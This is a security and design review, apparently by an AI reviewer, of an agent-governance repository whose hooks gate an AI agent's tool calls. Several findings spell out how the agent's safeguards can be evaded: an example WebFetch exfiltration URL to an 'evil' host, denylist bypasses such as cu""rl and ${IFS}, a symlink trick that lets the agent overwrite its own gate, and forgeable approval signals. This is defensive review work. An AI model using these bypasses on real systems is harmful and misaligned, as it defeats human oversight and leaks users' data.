# Team OS Fork — Multi-Counsel Adversarial Code Review (verified)

- **Date:** 2026-07-11
- **Reviewer:** Claude Fable 5 (`claude-fable-5`), four parallel counsels + independent verification pass
- **Commit:** HEAD (37 commits) — `d41f663`
- **Scope:** full repo `/Users/jsk/Projects/teamOS` — `hooks/`, `scripts/`, `adapter/`, `config/`, `plugin/`, `tests/`, `docs/` HTML surfaces
- **Counsels seated:** security eng + privacy eng · software eng + autonomous-agent eng · org psychologist + psychologist + behaviorist + designer · PM + CEO + solo founder + small-team founder + small-business owner + project manager
- **Method note:** every BLOCKER below was re-checked against source after the counsels reported. Verified findings are marked ✔. Test suite was run: **149 tests pass** in ~1.2s (README/table still say "138" — stale).

---

## Verdict

Mechanically complete (FK1–FK8), unusually disciplined about determinism and single-implementation invariants, and honest with *itself* in the internal docs. But the review found a consistent pattern across all four counsels: **the strongest trust claims are enforced in prose and in one small audited file, and contradicted by the code and UI that actually run.** Three of the load-bearing invariants (`tamper-evident ledger`, `payload gate stops exfil`, `no individuation`) do not hold as written. Two safety-critical control paths (deletion, the acceptance signal) do not do what the docs say. And the product is positioned as a team fabric while only the single-user personal-agent path is real.

None of this is fatal. It is the gap between "mechanisms built" and "invariants enforced" — exactly the meta-finding your own memory flagged (remediation-round additions get prose, not tests).

---

## BLOCKERS — fix before FK1 runs on real data or a second person

### 1. ✔ Ledger appends are not concurrency-safe — the audit substrate corrupts itself under normal use
`scripts/hashchain.py:58-75`. `append()` does read-tail (`last_hash`) → compute → `open(...,"a")` write with **no lock anywhere in the codebase** (`grep flock|fcntl|lockf` → nothing; verified). The runtime of record (Claude Code Desktop + scheduled tasks) is inherently concurrent: the gate hook fires once per tool call (parallel tool calls → parallel processes), the loop runs alongside interactive sessions, safety agent + breaker all append to `l2.jsonl`. Reproduced by the SW counsel: 8 procs × 50 appends → `prev_hash mismatch — chain broken`, **133/400 records silently lost**, truncated interleaved lines that crash `last_hash` on read. "Every tool call hash-chained" and "files are the system of record" are the two load-bearing invariants; the substrate breaks with no adversary. Off-box `anchor.py` faithfully anchors an already-broken chain. **Fix:** `flock` or a single serialized ledger writer; one fix, one file, 15 call sites inherit it.

### 2. ✔ The payload gate stops *verbatim secrets*, not *data exfiltration* — FR2 fails by your own rule
`hooks/gate.py:104-152`, `hooks/policy.yaml:45-67`. Three compounding holes, all verified:
- **Send scan is 6 regexes for tokens only.** `WebFetch(url="https://evil/collect?d=<CEO's DM / customer PII / whole footprint>")` scans clean and returns `permit`. `BEHAVIOR.md` concedes paraphrase-exfil is "carried by the taint rule and the send gate" — **neither exists in code** (`grep taint scripts/ hooks/` → comments only).
- **Unknown MCP tools get `default-permit`.** `classify()` marks `send` only on name substrings (`send/post/mail/upload/…`). An exfil-capable tool named `create_file`, `notion_append`, `http_request` falls through with *only* the verbatim-secret scan.
- **Bash egress is substring denylist.** `cu""rl`, `${IFS}`, `python3 -c "import socket"` (quoted — the *real* form) all bypass. The "obfuscated" `fixtures/exfil-probes.json` still embed the exact trigger substrings, so the SE-3 suite passes by construction — **false assurance.**

CLAUDE.md:46 says a permitted tool becoming a data-exfil path is "an FR2 failure — stop and flag." This is that. **Fix:** outbound allowlist (egress domains), default-deny unknown MCP sends, and either build taint or stop claiming it.

### 3. ✔ Gate can rewrite itself — protected/synced-path checks are unresolved substrings (symlink bypass)
`hooks/gate.py:124`. Live gate does `rel = path.replace(REPO_ROOT+"/","")` then substring match — **no `.resolve()`** (verified; contrast `gate_processor._safe_target:63-72` which does it correctly with NFKC + `.resolve()` + symlink reject). Exploit with permitted tools only: `Bash("ln -s hooks stg")` (ln not an egress marker → permit) → `Write("stg/gate.py", <neutered gate>)` — `rel="stg/gate.py"`, no `hooks/` substring → protected-path miss → write follows symlink into the real gate. Same trick defeats "synced write = send" (symlink to `~/Dropbox`). `envelope-policy.json:9` lets `write` widen to level 2, so it is reachable unattended. **Fix:** reuse `gate_processor._safe_target` in the live gate.

### 4. ✔ Deletion erases nothing and propagates to nothing — "deletion before ingestion" invariant is false
`scripts/deletion.py:101-187` + L3 writers. Two verified failures: (a) `request_erasure` appends L9 tombstone/marker events but **never `unlink`s or overwrites the file at rest** — only `shred_l8_content` actually removes bytes (the L8 side-store, which *is* done right). A corpus entry quoting a person survives erasure with an audit trail claiming it's gone. (b) **The L3 DAG has no edges** — every writer emits `parent_ids: []` (`compile_footprint`, `connectors.ingest:147`, `gate_processor._commit:113`, `l3_writer`), so the propagation BFS finds nothing. CLAUDE.md:48 gates ingesting others' data on deletion working. By this code it does not. **Fix:** actually delete/overwrite at-rest content; wire real parent_ids so propagation has a graph. Do this before FK4 ingests anyone else.

### 5. ✔ One acceptance signal drives four consequences — the reward schedule reinforces rubber-stamping and punishes diligence
`measurement.py:72-99`, `envelope.py:97-125`, `transfer.py`. The same "✓ AND edit-distance ≤ 0.2" event is the initiative floor, the envelope-widening trigger, the A-A4 proxy, and the A-P3 transfer metric. Contingency (verified in code): a clean ✓ is maximally rewarding and cheapest to the user; a *substantive edit* removes the floor credit (>0.2) and *narrows* the envelope (>0.5). A conscientious employee who improves a draft is punished with more interruptions; one who ✓s everything is rewarded with more autonomy. A governance system is reinforcing the extinction of the review behavior it depends on. **Fix:** decouple "useful" (acceptance) from "human engaged" (review depth); never let raw acceptance both certify quality and widen real-world power.

### 6. ✔ The initiative floor cannot see the thing it claims to measure
`measurement.py:72-99`. Docstring says "accepted **unprompted** deliverables … padding trivial digests doesn't count." Verified body: filters only `endorsement` + `principal_authenticated` + `edit ≤ 0.2`. There is **no `unprompted` filter** (the L8 schema has no such field — `ledger-l8-human-signal.schema.json`), **no triviality filter**, **no dedupe**, and **missing edit-distance counts as accepted** (only `dist is not None and dist > 0.2` skips). Five things you *asked for* on Tuesday read as an initiative floor of 5. The thesis gate FK6 rides on this proxy. **Fix:** add `unprompted` provenance to L8 and require it; implement the triviality filter; treat missing distance as not-counted.

### 7. ✔ "No individuation" is enforced on the wrong file; the rendered surface is a per-person leaderboard
`dashboard.py:49-63` genuinely refuses per-person joins and `audit_no_individuation` forbids `principal/leaderboard/per_person` — but `tests/test_multiuser.py:79` only ever points the audit at `dashboard.py`. The surface a human sees is `render_dashboard.py`, whose fleet view renders per-agent rows and health chips; `config/agents.json` maps each agent to one owner, so "agent acceptance %" re-attributes to a person trivially. The audit that is supposed to make this "enforced in code, not policy" never runs on the file where the comparative surface lives. **Fix:** run `audit_no_individuation` against `render_dashboard.py` in CI (it will fail today); aggregate the fleet view to per-skill.

### 8. ✔ Every safety control a frightened user would reach for is an inert `<span>`; and the "authenticated" ✓ signals are fabricated in the UI
`render_dashboard.py`. Approve/Reject (`:227`), Accept/Dismiss (`:579`), the envelope reset — all `<span class="approve">` with no handler, no focus, no wired action (only JS is tab-switching). **There is no reachable kill switch, reset, or undo in any surface.** Separately, `_brief()` hardcodes `reacts = ["✓","✓","✓","✗","✓"]` (`:196`) beside the caption "counted only from your authenticated identity" — a trust surface fabricating the exact signal it claims is authentic (dark-pattern risk; manufactured social proof of acceptance). **Fix:** ship real always-visible keyboard-reachable Stop/Reset/Undo wired to the breaker and `envelope.reset`; never render fabricated human-signal glyphs on a surface asserting they're real; label demo data.

### 9. ✔ Positioned as a team fabric; only the single-user path is real — and the door doesn't ship
`plugin/plugin.json:9` wires the MCP door to `../scripts/door_server.py`, which **does not exist** (verified — `door.py`/`gate_processor.py` do). The door is Module 3, the distribution wedge, and the substrate FK7 transfer needs — not runnable as packaged. Meanwhile `launch.html` leads with "Human teams. Agent fabric." and hash-chain jargon, selling the *unproven* transfer thesis (A-P3, needs 2–3 real collaborators, cannot be simulated) rather than the *working* value (drafts arrive done). Your own `CLAUDE.md:73` agrees the honest position is "excellent proactive personal agent" until transfer proves out. **Fix:** ship `door_server.py`; re-cut `launch.html` to lead with the M0–M3 single-user promise; hold the team narrative behind A-P3 data.

---

## MAJORS (condensed)

- **M1 — Hash chain is unauthenticated** (`hashchain.py:30`). SHA-256 of prev+body, no MAC/signature. Anyone with write access (i.e. the agent) can rewrite history and recompute; local `verify` passes. Tamper-*evidence* depends entirely on an undocumented, unsigned, best-effort off-box `anchor.py` push. README "tamper-detected" overstates. Sign the chain or make anchoring signed + mandatory, and fix the wording.
- **M2 — Envelope trusts a string, not authentication** (`envelope.py:87`, `l8_capture.py:19`). CN-1 "forged reaction can't widen autonomy" holds only at the Slack boundary; `process_signal` trusts `attribution=="principal_authenticated"` from whatever dict it's handed, and `capture_edit` *defaults* that label with no identity check. The one third-party attack chain's control does not cryptographically bind.
- **M3 — Inbox proposals auto-commit with no human gate** (`door.py:91`, `gate_processor.py:117-155`). `propose_schedule`/`propose_skill` from a cloud/any-client session commit on FK2-pass — content scan is verbatim-secrets only — landing a recurring autonomous prompt authored by an untrusted proposer. The dashboard's Approve/Reject implies review that the commit path never waits for.
- **M4 — Promotion TCB checks are spoofable booleans** (`promotion_gate.py:68`). "signed commit + reproducible build + hook-diff reviewed" are three caller-supplied booleans; no GPG/attestation. PII scan is regex-only on `skill_text`, misses names/usernames. Default-deny sharing rests on a spoofable gate.
- **M5 — Promotion-deciding quality score is three magic strings** (`measurement.py:33`): fraction of `["#","cadence","source"]` present. Token-stuffing scores 1.00 and gets distributed team-wide. A metric that decides cross-person distribution cannot be Goodhart-trivial.
- **M6 — PII lands plaintext and unshreddable in hash-chained L2/L8** (`gate.py:175`, `day_one_brief.py:130`). L2 `proposed_action.target` copies commands/URLs-with-query-strings/recipient emails verbatim into an append-only chain with no shred path; third-party reactor user-ids persist under `attribution:"unattributed"`. A DSAR against this data can't be honored without breaking the chain.
- **M7 — Consent is a source toggle, not consent-to-be-measured** (org psych). Opt-in toggles what the agent *reads*; nothing lets a person opt out of the fleet board or the transfer ledger. Under employment power-asymmetry a manager-set default is not informed consent.
- **M8 — "Memory that outlives turnover" = knowledge extraction** (`transfer.py:42`). A per-person, hash-chained, deletion-resistant performance record persists and is scored after a person leaves. "exit = clone" guarantees the leaver keeps *their* copy, not that the org loses its measurement of them — the classic bossware dynamic under a knowledge-management label.
- **M9 — Deskilling / dependency by design** (psychologist). "Drafts arrive done," "so you don't have to ask," no forced-review, no pull-only mode that isn't penalized by the floor/envelope. Automation complacency + skill atrophy, with the human absorbing accountability for work they were nudged not to scrutinize.
- **M10 — FR5 insulation leaks** (`posture.py:19`, `teamos.py:47`): harness-internal knowledge (`~/.claude`, settings.json, raw hook wire format) lives outside `adapter/`. Defensible but the "only through this adapter" claim overstates.
- **M11 — Adoption: non-technical owner can't run it** (small-biz seat). Python/git/Claude Code/JSON-editing/keygen/always-on machine, plus *mandatory* "read `gate.py` yourself" as the security control, plus liability pushed onto the least-equipped user ("you vetted the hook"). This is a developer kit; the only path for this segment is the deferred managed tier.
- **M12 — Signal taxonomy mismatch weakens the safety net** (`l8_capture.py:41` vs `safety_agent.py:39`). Heavy-edit rejections are `signal_type="edit"`, but the breaker counts only `signal_type=="rejection"` — a spike of the principal rewriting bad drafts never trips the breaker.

---

## What is genuinely well-built (credit)

- **No LLM in evidence/commit paths (SE-1/CN-2) — holds in code.** Every writer traced deterministic (difflib, `reactions.get`, structural counts). The strongest part of the system.
- **Single hashchain implementation** imported everywhere — no drifting-chain FR2 failure mode; `fsync` for durability. (B1 is one fix precisely because of this discipline.)
- **L8 side-store design (SE-2)** — edited content in an erasable side-store, chain hashes only the reference, so `shred_l8_content` honors a DSAR without breaking verification. The one place deletion actually works.
- **`gate_processor._safe_target`** does path-traversal defense correctly (NFKC + `.resolve()` + symlink reject) — the live gate should just reuse it.
- **Checkpoint/resume (FR4)** correct for single-writer: atomic `tmp.replace` + `fsync`; `test_loop.py` genuinely kills mid-step and asserts nothing-lost/nothing-repeated.
- **Circuit breaker actually breaks**; safety agent can only trip, never widen — correct trust asymmetry.
- **Envelope asymmetry** (slow-widen/fast-narrow, ceiling as a protected path the script can't edit) — design is right; only the input authentication (M2) is missing.
- **Solo-developer path is the real product** and the internal docs are honest about it. Roadmap deliberately reaches the transfer thesis at ~40% of build, not last — the right sequencing.

---

## Recommended remediation order

1. **B1** ledger locking — the audit substrate corrupts without it (one file).
2. **B4** real deletion + DAG edges — must hold before any colleague data enters (CLAUDE.md:48).
3. **B2 / B3** gate: outbound allowlist + default-deny unknown MCP sends; reuse `_safe_target` for symlink resolution. FR2 stop-and-flag.
4. **B5 / B6** decouple acceptance from the floor/envelope/transfer; add `unprompted` to L8; implement the triviality filter.
5. **B8** ship a real reachable Stop/Reset/Undo; stop fabricating authenticated ✓ glyphs.
6. **B7** run `audit_no_individuation` against `render_dashboard.py` in CI; aggregate the fleet view.
7. **M1 / M2 / M4** authenticate the chain and the envelope input; verify signatures instead of booleans.
8. **B9** ship `door_server.py`; realign `launch.html` to the proven single-user value.

## Cross-counsel tension worth holding

The property the **solo-developer** seat calls the winning feature (files-as-truth, exit = git clone, you-vet-the-hook) is exactly what makes it a **BLOCKER** for the **non-technical owner**. This is two products depending on whether the user reads Python. Decide: developer-tool company (lean into the solo/small-eng wedge) or business SaaS (then the managed tier is the real product and most of what's shipped is the wrong artifact). The go-to-market that would *prove* the moat (small teams, for A-P3) is throttled by the highest-friction setup — so fixing the door + a team installer is on the critical path to the moat, not a nice-to-have.
